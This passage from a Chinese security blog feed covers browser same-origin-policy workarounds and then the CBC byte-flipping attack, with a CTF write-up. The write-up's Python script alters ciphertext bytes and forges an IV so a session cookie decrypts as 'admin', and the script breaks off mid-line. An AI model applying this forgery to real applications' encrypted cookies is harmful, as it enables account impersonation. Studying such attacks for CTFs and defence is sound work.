class="hljs-keyword">write</span><span class="hljs-keyword">Cross</span>-origin <span class="hljs-keyword">read</span><span class="hljs-keyword">Cross</span>-origin embedding</code></pre><p>在这三种行为之中，通常情况下只有<code>Cross-origin read</code>是不被允许的，其余的两种是允许的，例如<code>Cross-origin write</code>中的<code>links</code>，重定向以及表单提交，<code>Cross-origin embedding</code>中的资源嵌入。<br>那么问题又来了，何种资源是允许嵌入的呢？MDN 文档中也给出了一些例子<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy#%E8%B7%A8%E6%BA%90%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE" target="_blank" rel="noopener">MDN</a>：</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"..."</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"..."</span>&gt;</span>标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的Content-Type消息头，不同浏览器有不同的限制。<span class="hljs-tag">&lt;<span class="hljs-name">img</span>&gt;</span>嵌入图片。支持的图片格式包括 PNG,JPEG,GIF,BMP,SVG,...<span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span> 和 <span class="hljs-tag">&lt;<span class="hljs-name">audio</span>&gt;</span>嵌入多媒体资源。<span class="hljs-tag">&lt;<span class="hljs-name">object</span>&gt;</span>, <span class="hljs-tag">&lt;<span class="hljs-name">embed</span>&gt;</span> 和 <span class="hljs-tag">&lt;<span class="hljs-name">applet</span>&gt;</span>的插件。@font-face引入的字体。一些浏览器允许跨域字体（cross-origin fonts），一些需要同源字体（same-origin fonts）。<span class="hljs-tag">&lt;<span class="hljs-name">frame</span>&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span>载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。</code></pre><p><strong>这样一来，可以通过<code>&lt;img&gt;</code>标签加载文件而不受同源策略的影响这件事情就明白了。</strong></p><h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h1><blockquote><p>其实我看到这里就开始产生疑问，既然有浏览器同源策略限制，<br>1.xss是怎么传递cookie。<br>2.跨域的资源是怎么读取的。<br>3.服务端是怎么能够读取到浏览器传递的header信息。<br>接下来就要谈一谈同源策略的规避方法</p></blockquote><h1 id="src标签"><a href="#src标签" class="headerlink" title="src标签"></a>src标签</h1><p><em>具备src的标签</em><br><em>原理</em>：所有具有src属性的HTML标签都是可以跨域的<br>在浏览器中，<code>&lt;script&gt;、&lt;img&gt;、&lt;iframe&gt;和&lt;link&gt;</code>这几个标签是可以加载跨域（非同源）的资源的，并且加载的方式其实相当于一次普通的GET请求，唯一不同的是，为了安全起见，浏览器不允许这种方式下对加载到的资源的读写操作，而只能使用标签本身应当具备的能力（比如脚本执行、样式应用等等）。</p><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><p><code>document.domain</code><br>cookie是服务器写入浏览器的一小段信息，只有<em>同源</em>的网页才能共享。但是，两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置<code>document.domain</code>共享 Cookie。<br>举例来说，A网页是<code>http://w1.example.com/a.html</code>，B网页是<code>http://w2.example.com/b.html</code>，那么只要设置相同的<code>document.domain</code>，两个网页就可以共享<code>Cookie</code>。</p><p><code>document.domain = &#39;example.com&#39;;</code></p><p><em>现在，A网页通过脚本设置一个 Cookie。</em></p><p><code>document.cookie = &quot;test1=hello&quot;;</code></p><p><em>B网页就可以读到这个 Cookie。</em></p><p><code>var allCookie = document.cookie;</code></p><p>注意，这种方法只适用于 <code>Cookie</code> 和 <code>iframe</code>窗口，<code>LocalStorag</code>e 和 <code>IndexDB</code> 无法通过这种方法，规避同源政策，而要使用下文介绍的<code>PostMessage API</code>。<br>另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如<code>.example.com</code>。</p><p><code>Set-Cookie: key=value; domain=.example.com; path=/</code></p><p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。</p><h1 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h1><p><em>同源政策规定，AJAX请求只能发给同源的网址，否则就报错。</em><br>除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。</p><pre><code class="hljs ebnf"><span class="hljs-attribute">JSONP</span><span class="hljs-attribute">WebSocket</span><span class="hljs-attribute">CORS</span></code></pre><h2 id="1-JSONP跨域"><a href="#1-JSONP跨域" class="headerlink" title="1.JSONP跨域"></a>1.JSONP跨域</h2><p>原理：<code>&lt;script&gt;</code>是可以跨域的，而且在跨域脚本中可以直接回调当前脚本的函数<br>script标签是可以加载异域的JavaScript并执行的，通过预先设定好的callback函数来实现和母页面的交互。它有一个大名，叫做JSONP跨域，JSONP是JSON with Padding的略称。它是一个非官方的协议，明明是加载script，为啥和JSON扯上关系呢？原来就是这个callback函数，对它的使用有一个典型的方式，就是通过JSON来传参，即将JSON数据填充进回调函数，这就是JSONP的JSON+Padding的含义。JSONP只支持GET请求。<br><em>前端代码</em></p><pre><code class="hljs xml">/<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">javascript</span>"&gt;</span>/`<span class="actionscript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dosomething</span><span class="hljs-params">(jsondata)</span></span>&#123;</span><span class="actionscript">        <span class="hljs-comment">//处理获得的json数据</span></span>    &#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>`<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://haorooms.com/data.php?callback=dosomething"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p><em>后台代码：</em></p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$callback = $_GET[<span class="hljs-string">'callback'</span>];<span class="hljs-comment">//得到回调函数名</span></span><span class="php">$data = <span class="hljs-keyword">array</span>(<span class="hljs-string">'a'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>);<span class="hljs-comment">//要返回的数据</span></span><span class="php"><span class="hljs-keyword">echo</span> $callback.<span class="hljs-string">'('</span>.json_encode($data).<span class="hljs-string">')'</span>;<span class="hljs-comment">//输出</span></span><span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre><h2 id="2-跨域资源共享（CORS）"><a href="#2-跨域资源共享（CORS）" class="headerlink" title="2. 跨域资源共享（CORS）"></a>2. 跨域资源共享（CORS）</h2><p><em>原理</em>:服务器设置<code>Access-Control-Allow-Origin</code> HTTP响应头之后，浏览器将会允许跨域请求<br>CORS是HTML5标准提出的跨域资源共享<code>(Cross Origin Resource Share)</code>，支持GET、POST等所有HTTP请求。CORS需要服务器端设置Access-Control-Allow-Origin头，否则浏览器会因为安全策略拦截返回的信息。</p><pre><code class="hljs less"><span class="hljs-attribute">Access-Control-Allow-Origin</span>: *              # 允许所有域名访问，或者<span class="hljs-attribute">Access-Control-Allow-Origin</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//a.com   # 只允许所有域名访问</span></code></pre><p>CORS又分为简单跨域和非简单跨域请求，有关CORS的详细介绍请看阮一峰的跨域资源共享CORS 详解，里面讲解的非常详细。</p><h2 id="3-WebSocket"><a href="#3-WebSocket" class="headerlink" title="3. WebSocket"></a>3. WebSocket</h2><p><code>WebSocket</code>是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。<br>下面是一个例子，浏览器发出的WebSocket请求的头信息（摘自维基百科）。</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/chat</span> HTTP/1.1<span class="hljs-attribute">Host</span>: server.example.com<span class="hljs-attribute">Upgrade</span>: websocket<span class="hljs-attribute">Connection</span>: Upgrade<span class="hljs-attribute">Sec-WebSocket-Key</span>: x3JJHMbDL1EzLkh9GBhXDw==<span class="hljs-attribute">Sec-WebSocket-Protocol</span>: chat, superchat<span class="hljs-attribute">Sec-WebSocket-Version</span>: 13<span class="hljs-attribute">Origin</span>: http://example.com</code></pre><p>上面代码中，有一个字段是<code>Origin</code>，表示该请求的请求源（<code>origin</code>），即发自哪个域名。<br>正是因为有了<code>Origin</code>这个字段，所以<code>WebSocket</code>才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p><pre><code class="hljs routeros">HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=Sec-WebSocket-Protocol: chat</code></pre><h1 id="iframe（DOM型）"><a href="#iframe（DOM型）" class="headerlink" title="iframe（DOM型）"></a>iframe（DOM型）</h1><p>如果两个网页不同源，就无法拿到对方的DOM。典型的例子是<code>iframe</code>窗口和<code>window.open</code>方法打开的窗口，它们与父窗口无法通信。<br>比如，父窗口运行下面的命令，如果iframe窗口不是同源，就会报错。</p><pre><code class="hljs dart"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"myIFrame"</span>).contentWindow.<span class="hljs-built_in">document</span><span class="hljs-comment">// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.</span></code></pre><p>上面命令中，父窗口想获取子窗口的DOM，因为跨源导致报错。<br>反之亦然，子窗口获取主窗口的DOM也会报错。</p><p><code>window.parent.document.body</code><br>// 报错</p><p>如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document.domain属性，就可以规避同源政策，拿到DOM。<br>对于完全不同源的网站，目前有三种方法，可以解决跨域窗口的通信问题。<br>片段识别符（fragment identifier）</p><h2 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h2><p>跨文档通信API（<code>Cross-document messaging</code>）</p><h3 id="3-1-片段识别符"><a href="#3-1-片段识别符" class="headerlink" title="3.1 片段识别符"></a>3.1 片段识别符</h3><p>片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如<code>http://example.com/x.html#fragment</code>的<code>#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。<br>父窗口可以把信息，写入子窗口的片段标识符。</p><pre><code class="hljs dart"><span class="hljs-keyword">var</span> src = originURL + <span class="hljs-string">'#'</span> + data;<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">'myIFrame'</span>).src = src;</code></pre><p>子窗口通过监听<code>hashchange</code>事件得到通知。</p><pre><code class="hljs javascript"><span class="hljs-built_in">window</span>.onhashchange = checkMessage;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkMessage</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-keyword">var</span> message = <span class="hljs-built_in">window</span>.location.hash;  <span class="hljs-comment">// ...</span>&#125;</code></pre><p>同样的，子窗口也可以改变父窗口的片段标识符。</p><p><code>parent.location.href= target + &quot;#&quot; + hash;</code></p><h3 id="3-2-window-name"><a href="#3-2-window-name" class="headerlink" title="3.2 window.name"></a>3.2 window.name</h3><p>浏览器窗口有<code>window.name</code>属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。<br>父窗口先打开一个子窗口，载入一个不同源的网页，该网页将信息写入window.name属性。</p><p><code>window.name = data;</code></p><p>接着，子窗口跳回一个与主窗口同域的网址。</p><p><code>location = &#39;http://parent.url.com/xxx.html&#39;;</code></p><p>然后，主窗口就可以读取子窗口的<code>window.name</code>了。</p><p><code>var data = document.getElementById(&#39;myFrame&#39;).contentWindow.name;</code></p><p>这种方法的优点是，<code>window.name</code>容量很大，可以放置非常长的字符串；缺点是必须监听子窗口window.name属性的变化，影响网页性能。</p><h3 id="3-3-window-postMessage"><a href="#3-3-window-postMessage" class="headerlink" title="3.3 window.postMessage"></a>3.3 window.postMessage</h3><p>该方法只解决了前端两个窗口的通信，但无法解决前后台调用的跨域问题<br>上面两种方法都属于破解，HTML5为了解决这个问题，引入了一个全新的API：跨文档通信 <code>API（Cross-document messaging）</code>。<br>这个API为window对象新增了一个window.postMessage方法，允许跨窗口通信，不论这两个窗口是否同源。<br>举例来说，父窗口<code>http://aaa.com</code>向子窗口<code>http://bbb.com</code>发消息，调用<code>postMessage</code>方法就可以了。</p><pre><code class="hljs dart"><span class="hljs-keyword">var</span> popup = <span class="hljs-built_in">window</span>.open(<span class="hljs-string">'http://bbb.com'</span>, <span class="hljs-string">'title'</span>);popup.postMessage(<span class="hljs-string">'Hello World!'</span>, <span class="hljs-string">'http://bbb.com'</span>);</code></pre><p><code>postMessage</code>方法的第一个参数是具体的信息内容，第二个参数是接收消息的窗口的源（origin），即”协议 + 域名 + 端口”。也可以设为*，表示不限制域名，向所有窗口发送。<br>子窗口向父窗口发送消息的写法类似。</p><p><code>window.opener.postMessage(&#39;Nice to see you&#39;, &#39;http://aaa.com&#39;);</code></p><p>父窗口和子窗口都可以通过message事件，监听对方的消息。</p><pre><code class="hljs javascript"><span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">'message'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) </span>&#123;  <span class="hljs-built_in">console</span>.log(e.data);&#125;,<span class="hljs-literal">false</span>);</code></pre><p>message事件的事件对象event，提供以下三个属性。</p><pre><code class="hljs mel"><span class="hljs-keyword">event</span>.<span class="hljs-keyword">source</span>：发送消息的窗口<span class="hljs-keyword">event</span>.origin: 消息发向的网址<span class="hljs-keyword">event</span>.data: 消息内容</code></pre><p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p><pre><code class="hljs reasonml">window.add<span class="hljs-constructor">EventListener('<span class="hljs-params">message</span>', <span class="hljs-params">receiveMessage</span>)</span>;<span class="hljs-keyword">function</span> receive<span class="hljs-constructor">Message(<span class="hljs-params">event</span>)</span> &#123;  event.source.post<span class="hljs-constructor">Message('Nice <span class="hljs-params">to</span> <span class="hljs-params">see</span> <span class="hljs-params">you</span>!', '<span class="hljs-operator">*</span>')</span>;&#125;</code></pre><p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p><pre><code class="hljs mel"><span class="hljs-keyword">window</span>.addEventListener(<span class="hljs-string">'message'</span>, receiveMessage);function receiveMessage(<span class="hljs-keyword">event</span>) &#123;  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">event</span>.origin !== <span class="hljs-string">'http://aaa.com'</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">event</span>.data === <span class="hljs-string">'Hello World'</span>) &#123;      <span class="hljs-keyword">event</span>.<span class="hljs-keyword">source</span>.postMessage(<span class="hljs-string">'Hello'</span>, <span class="hljs-keyword">event</span>.origin);  &#125; <span class="hljs-keyword">else</span> &#123;    console.<span class="hljs-keyword">log</span>(<span class="hljs-keyword">event</span>.data);  &#125;&#125;</code></pre><h3 id="3-4-LocalStorage"><a href="#3-4-LocalStorage" class="headerlink" title="3.4 LocalStorage"></a>3.4 LocalStorage</h3><p>通过window.postMessage，读写其他窗口的 LocalStorage 也成为了可能。<br>下面是一个例子，主窗口写入iframe子窗口的localStorage。</p><pre><code class="hljs reasonml">window.onmessage = <span class="hljs-keyword">function</span>(e) &#123;  <span class="hljs-keyword">if</span> (e.origin !== 'http:<span class="hljs-comment">//bbb.com') &#123;</span>    return;  &#125;  var payload = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parse(e.data);  localStorage.set<span class="hljs-constructor">Item(<span class="hljs-params">payload</span>.<span class="hljs-params">key</span>, JSON.<span class="hljs-params">stringify</span>(<span class="hljs-params">payload</span>.<span class="hljs-params">data</span>)</span>);&#125;;</code></pre><p>上面代码中，子窗口将父窗口发来的消息，写入自己的<code>LocalStorage</code>。<br>父窗口发送消息的代码如下。</p><pre><code class="hljs reasonml">var win = document.get<span class="hljs-constructor">ElementsByTagName('<span class="hljs-params">iframe</span>')</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>.contentWindow;var obj = &#123; name: 'Jack' &#125;;win.post<span class="hljs-constructor">Message(JSON.<span class="hljs-params">stringify</span>(&#123;<span class="hljs-params">key</span>: '<span class="hljs-params">storage</span>', <span class="hljs-params">data</span>: <span class="hljs-params">obj</span>&#125;)</span>, 'http:<span class="hljs-comment">//bbb.com');</span></code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/86078" target="_blank" rel="noopener">漫谈同源策略攻防</a><br><a href="https://lightless.me/archives/review-SOP.html" target="_blank" rel="noopener">再谈同源策略</a><br><a href="https://xz.aliyun.com/t/224" target="_blank" rel="noopener">跨域方法总结</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>基础笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CBC字节翻转攻击</title>
    <link href="/2019/03/16/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    <url>/2019/03/16/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="分组密码工作模式"><a href="#分组密码工作模式" class="headerlink" title="分组密码工作模式"></a>分组密码工作模式</h1><p><a href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F" target="_blank" rel="noopener">分组密码工作模式</a></p><blockquote><blockquote><p>密码学中，分组（block）密码的工作模式（mode of operation）允许使用同一个分组密码密钥对多于一块的数据进行加密，并保证其安全性。[1][2] 分组密码自身只能加密长度等于密码分组长度的单块数据，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到匹配密码块大小的长度。一种工作模式描述了加密每一数据块的过程，并常常使用基于一个通常称为初始化向量的附加输入值以进行随机化，以保证安全[1]。</p></blockquote></blockquote><p><strong>这段话说的意思是对明文进行分块，分成相同字节的块数据。先使用等长字节数初始向量进行加密对第一块明文，之后的每一明文块都使用想同长度的密文块对明文块进行加密。所以可知密文和明文的每一个字节是一一对应的。解密也是如此，字节数相同的明文块和密文块进行解密。</strong></p><h1 id="密码块链接（CBC）"><a href="#密码块链接（CBC）" class="headerlink" title="密码块链接（CBC）"></a>密码块链接（CBC）</h1><h2 id="加密过程："><a href="#加密过程：" class="headerlink" title="加密过程："></a>加密过程：</h2><p><strong>Ciphertext-0 = Encrypt(Plaintext XOR IV)—只用于第一个组块</strong><br><strong>Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1)—用于第二及剩下的组块</strong><br><img src="./1.jpg" srcset="/img/loading.gif" alt=""></p><p><strong>Plaintext</strong>：待加密的数据。<br><strong>IV</strong>：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。<br><strong>Key</strong>：被一些如AES的对称加密算法使用。<br><strong>Ciphertext</strong>：加密后的数据。</p><h2 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h2><p><strong>Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</strong><br><strong>Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</strong><br><img src="./2.jpg" srcset="/img/loading.gif" alt=""></p><h1 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h1><p><strong>Ciphertext-N-1（密文-N-1)</strong>是用来产生下一块明文；这就是字节翻转攻击开始发挥作用的地方<br>如果我们改变<strong>Ciphertext-N-1（密文-N-1）</strong>的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！<br><img src="./3.jpg" srcset="/img/loading.gif" alt=""></p><h1 id="攻击过程详解"><a href="#攻击过程详解" class="headerlink" title="攻击过程详解"></a>攻击过程详解</h1><p>先看解密过程<br><img src="./4.jpg" srcset="/img/loading.gif" alt=""></p><p><strong>Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</strong><br><strong>Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</strong><br>即<br>*<em>明文= Descrypt(本组密文) ^ 上组密文 *</em></p><p><code>C    =    A        ^                B</code></p><h2 id="通俗公式推导"><a href="#通俗公式推导" class="headerlink" title="通俗公式推导"></a>通俗公式推导</h2><pre><code class="hljs mipsasm">数学公式异或关系表达式如下A ^ A =<span class="hljs-number">0</span> , <span class="hljs-keyword">B^ </span><span class="hljs-keyword">B </span>=<span class="hljs-number">0</span> , <span class="hljs-number">0</span>^ <span class="hljs-number">0</span> =<span class="hljs-number">0</span> , <span class="hljs-number">0</span> ^ 任一字符= 任一字符可得 A ^ <span class="hljs-keyword">B </span>^ C=A^ <span class="hljs-keyword">B </span>^ A ^ <span class="hljs-keyword">B </span>= <span class="hljs-number">0</span>综合所述CBC字节翻转公式：A ^ <span class="hljs-keyword">B </span>^ C =<span class="hljs-number">0</span>  =&gt;   A ^ <span class="hljs-keyword">B </span>^ C ^ <span class="hljs-string">" 想要字符"</span>=A ^ <span class="hljs-keyword">B </span>^A ^ <span class="hljs-keyword">B </span>^ <span class="hljs-string">"想要字符"</span>  =  <span class="hljs-number">0</span> ^ “想要字符” =   “想要字符”通俗讲：想要字符 = 本组密文(A) ^  上组密文(<span class="hljs-keyword">B) </span>^ 本组明文字节(C) <span class="hljs-comment">## 本组密文，上组密文对应位置该字符</span></code></pre><p>借用<a href="http://drops.xmd5.com/static/drops/tips-7828.html" target="_blank" rel="noopener">CBC字节翻转攻击-101Approach</a> 中PHP脚本中演示翻转结果</p><pre><code class="hljs perl">$v = <span class="hljs-string">"a:2:&#123;s:4:"</span>name<span class="hljs-string">";s:6:"</span>sdsdsd<span class="hljs-string">";s:8:"</span>greeting<span class="hljs-string">";s:20:"</span>echo <span class="hljs-string">'Hello sdsdsd!'</span><span class="hljs-string">";&#125;"</span>;$enc = @encrypt($v);$enc[<span class="hljs-number">2</span>] = <span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>($enc[<span class="hljs-number">2</span>]) ^ <span class="hljs-keyword">ord</span>(<span class="hljs-string">"6"</span>) ^ <span class="hljs-keyword">ord</span> (<span class="hljs-string">"7"</span>));$b = @decrypt($enc);</code></pre><p><img src="./5.jpg" srcset="/img/loading.gif" alt=""><br><strong><em>可以看到 6 被翻转为 7</em></strong></p><h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>通读全篇代码并未对<code>password</code>进行验证，而是关注于<code>username</code>验证。<br>用户在登录界面输入<code>username</code> 和 <code>password</code>。先进入第<strong>76</strong>行进行验证，如果是以<code>admin</code>进行登入则会显示登录失败。<br>在第<strong>63</strong>行，拿到flag需要使用admin进行登入，所以这里与第<strong>76</strong>行代码产生矛盾。<br>如果我们使用<code>cookie session</code>进行登入，程序会进入第<strong>84</strong>行，会执行两个方法<code>check_login()</code>和<code>show_homepage()</code>。 <code>show_homepage()</code>是我们拿到flag的方法入口。而在<code>check_login()</code>，通过解密在<code>$_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];</code> 下会对<code>username</code>重新赋值.<br>所以我们的方法是使用<strong>cbc字节翻转</strong>对<code>cipher</code>中的登入账户的某个字节进行翻转得到<code>&quot;admin&quot;</code></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>根据我们上述的方法，编写python代码得到新的cipher  ， new_cipher</p><pre><code class="hljs routeros">import base64import urllib<span class="hljs-attribute">offset</span>=0<span class="hljs-attribute">cipher</span>=<span class="hljs-string">'JYMQwKhTEMlRtwFGwuLz36oSosohsx%2BM50msZbWxWNHttjPFQuMGIfVpEEZpZt9aZvxSeohC7XfVmi78v8oyVw%3D%3D'</span><span class="hljs-attribute">cipher</span>=base64.b64decode(urllib.unquote(cipher))<span class="hljs-attribute">serialize_info</span>=<span class="hljs-string">'a:2:&#123;s:8:"username";s:5:"bdmin";s:8:"password";s:5:"admin";&#125;'</span><span class="hljs-attribute">serialize_info1</span>=serialize_info[0:16]<span class="hljs-attribute">serialize_info2</span>=serialize_info[16:32]<span class="hljs-attribute">serialize_info3</span>=serialize_info[32:]array_seria=[serialize_info1,serialize_info2,serialize_info3]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(array_seria[1])):<span class="hljs-keyword">if</span> array_seria[1][i]==<span class="hljs-string">'b'</span> <span class="hljs-keyword">in</span> array_seria[1]:<span class="hljs-builtin-name">print</span>(str(array_seria[1][i])+<span class="hljs-string">' index is:'</span>+str(i))<span class="hljs-attribute">offset</span>=inew_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(<span class="hljs-string">"b"</span>)^ord(<span class="hljs-string">"a"</span>)) + cipher[offset+1:]<span class="hljs-builtin-name">print</span>(<span class="hljs-string">'new_cipher :  '</span>+urllib.quote_plus(base64.b64encode(new_cipher)))</code></pre><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><p>放入<code>burpsuite</code>中替换<code>cipher</code><br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p>提示反序列化失败，对返回的<code>base64</code>代码进行解码<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h1 id="解决首字块乱码"><a href="#解决首字块乱码" class="headerlink" title="解决首字块乱码"></a>解决首字块乱码</h1><p>发现前16个字节块反序列化失败，所以这里可以知道cbc加密是分16字节每块进行加密。<br><strong>因为第一块明文加密是使用iv初始向量进行加密，而用于一同解密的密文被我们改变,造成解密出现不可预知的乱码。</strong></p><pre><code class="hljs isbl">根据第一块解密公式<span class="hljs-variable">Plaintext</span>-<span class="hljs-number">0</span> = <span class="hljs-function"><span class="hljs-title">Decrypt</span>(<span class="hljs-variable">Ciphertext</span>) <span class="hljs-variable">XOR</span> <span class="hljs-variable">IV</span></span><span class="hljs-function">可得新向量</span><span class="hljs-function"><span class="hljs-variable">new_iv</span> = <span class="hljs-variable">Plaintext</span>-<span class="hljs-number">0</span> ^ <span class="hljs-title">Decrypt</span>(<span class="hljs-variable">Ciphertext</span>)</span>新的初始向量 = 十六字节明文 ^ <span class="hljs-function"><span class="hljs-title">Decrypt</span>(前十六字节密文<span class="hljs-variable">new_cipher</span>)</span></code></pre><p>编写<code>python</code>代码如下</p><pre><code class="hljs haxe"><span class="hljs-keyword">new</span><span class="hljs-type">_iv</span>=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">16</span>):<span class="hljs-type"></span><span class="hljs-type"> new_iv</span>=<span class="hljs-keyword">new</span><span class="hljs-type">_iv</span>+chr(ord(iv[j]) ^ ord(res[j]) ^ ord(array_seria[<span class="hljs-number">0</span>][j]))<span class="hljs-keyword">new</span><span class="hljs-type">_iv</span>=urllib.quote(base64.b64encode(<span class="hljs-keyword">new</span><span class="hljs-type">_iv</span>))print(<span class="hljs-string">'new_iv: '</span>+<span class="hljs-keyword">new</span><span class="hljs-type">_iv</span>)</code></pre><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>将新<code>iv,cipher</code> 替换旧<code>iv , cipher</code>可得flag</p><p><img src="./11.png" srcset="/img/loading.gif" alt=""></p><h1 id="解题python代码"><a href="#解题python代码" class="headerlink" title="解题python代码"></a>解题python代码</h1><pre><code class="hljs routeros">import base64import urllib<span class="hljs-attribute">offset</span>=0<span class="hljs-attribute">cipher</span>=<span class="hljs-string">'JYMQwKhTEMlRtwFGwuLz36oSosohsx%2BM50msZbWxWNHttjPFQuMGIfVpEEZpZt9aZvxSeohC7XfVmi78v8oyVw%3D%3D'</span><span class="hljs-attribute">cipher</span>=base64.b64decode(urllib.unquote(cipher))<span class="hljs-attribute">serialize_info</span>=<span class="hljs-string">'a:2:&#123;s:8:"username";s:5:"bdmin";s:8:"password";s:5:"admin";&#125;'</span><span class="hljs-attribute">serialize_info1</span>=serialize_info[0:16]<span class="hljs-attribute">serialize_info2</span>=serialize_info[16:32]<span class="hljs-attribute">serialize_info3</span>=serialize_info[32:]array_seria=[serialize_info1,serialize_info2,serialize_info3]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(array_seria[1])):<span class="hljs-keyword">if</span> array_seria[1][i]==<span class="hljs-string">'b'</span> <span class="hljs-keyword">in</span> array_seria[1]:<span class="hljs-builtin-name">print</span>(str(array_seria[1][i])+<span class="hljs-string">' index is:'</span>+str(i))<span class="hljs-attribute">offset</span>=inew_cipher = cipher[:offset] + chr(ord(cipher[offset])^ord(<span class="hljs-string">"b"</span>)^ord(<span class="hljs-string">"a"</span>)) + cipher[offset+1:]<span class="hljs-builtin-name">print</span>(<span class="hljs-string">'new_cipher :  '</span>+urllib.quote_plus(base64.b64encode(new_cipher)))res = base64.b64decode(<span class="hljs-string">'X2+7PVoBz5Fx/1OCajQkHm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ=='</span>);iv = base64.b64decode(urllib.unquote(<span 